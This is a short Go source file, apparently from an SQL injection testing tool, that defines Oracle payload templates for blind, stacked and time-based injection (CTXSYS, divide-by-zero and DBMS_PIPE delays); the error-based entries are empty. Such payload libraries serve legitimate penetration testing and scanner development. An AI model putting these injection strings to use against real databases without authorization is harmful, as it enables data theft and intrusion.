package luvsqli

//OracleBlind is a map of Blind Based Attack Vectors for Oracle Database
var OracleBlind = map[string]string{
	"and_ctxsys": "%s AND (SELECT (CASE WHEN (%s) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2028) END) FROM DUAL) IS NULL%s",
	"or_ctxsys":  "%s OR (SELECT (CASE WHEN (%s) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2028) END) FROM DUAL) IS NULL%s",
	"stacked":    "%s;SELECT (CASE WHEN (%s) THEN 8359 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL%s",
}

//OracleError is a map ofError Based Attack Vectors for Oracle Database
var OracleError = map[string]string{
	"xml":     "",
	"host":    "",
	"ctxsys":  "",
	"utility": "",
}

//OracleStacked is a map of Stacked Based Attack Vectors for Oracle Database
var OracleStacked = map[string]string{
	"dbms_pipe": "%s;SELECT DBMS_PIPE.RECEIVE_MESSAGE((%s),5) FROM DUAL%s",
}
